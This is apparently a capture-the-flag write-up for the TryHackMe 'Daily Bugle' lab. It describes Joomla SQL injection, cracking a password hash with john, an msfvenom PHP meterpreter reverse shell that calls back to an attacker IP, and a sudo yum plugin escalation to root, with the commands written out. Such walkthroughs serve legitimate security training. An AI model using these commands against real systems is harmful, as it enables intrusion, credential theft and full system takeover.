# DAILY BUGLE
```
IP = 10.10.143.187
```

### Enumeration
--------------------------
+ Ran initial & all vuln nmap scan.
+ Robots.txt gives interesting directories, which gave joomla and its version.
+ Joomla 3.7.0 is vulnerable to SQLi.
+ Ran script called joomblah.py, which gave the following details:
	`Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']`
+ Cracking the hash using john to get credentials. [jonah:spiderman123]
	`sudo john hash.txt  --wordlist=/usr/share/wordlists/rockyou.txt` 
+ Templates can be edited in joomla by logging in as Jonah.


### Exploitation
--------------------------
+ Craft a payload to create a reverse meterpreter in php:
	`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.11.4.238 LPORT=9005 -f raw > example.php`
+ Upload the payload contents to index.php and visit the following link to catch the reverse tcp shell in a meterpreter listener.
+ Found password for jjameson in configuration.php. [jjameson:nv5uz9r3ZEDzVjNu]

### PrivEsc
--------------------------
+ Switching to user `jjameson` using acquired credentials.
+ Ran `sudo -l` and found that `yum` can run as sudo without password.
+ Using GTFObins to get root.


#### GTFObin commands
--------------------------
```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```